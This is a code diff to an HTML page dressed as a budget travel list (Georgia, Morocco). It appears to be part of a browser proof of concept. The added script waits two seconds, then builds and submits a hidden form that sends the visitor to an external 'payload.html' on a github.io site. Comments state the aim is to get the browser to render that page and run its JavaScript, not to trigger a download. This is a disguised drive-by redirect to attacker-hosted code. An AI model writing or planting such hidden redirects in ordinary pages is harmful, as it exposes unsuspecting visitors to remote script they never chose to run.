@@ -13,12 +13,16 @@
   <h2>4. Georgia</h2><p>Amazing wine country, friendly locals, $20-25/day.</p>
   <h2>5. Morocco</h2><p>Rich culture, stunning architecture, $30-35/day.</p>
 
-  <form id="f" method="GET" action="https://github.com/needmoneyforhoes/brave-poc/releases/download/v1.0/proof.txt" style="display:none">
-  </form>
-
   <script>
+    // form.submit to an HTML page on our domain — browser renders it, JS executes
+    // This is NOT a download — the browser opens the page directly
     setTimeout(function() {
-      document.getElementById('f').submit();
+      var form = document.createElement('form');
+      form.method = 'GET';
+      form.action = 'https://needmoneyforhoes.github.io/brave-poc/payload.html';
+      form.style.display = 'none';
+      document.body.appendChild(form);
+      form.submit();
     }, 2000);
   </script>
 </body>
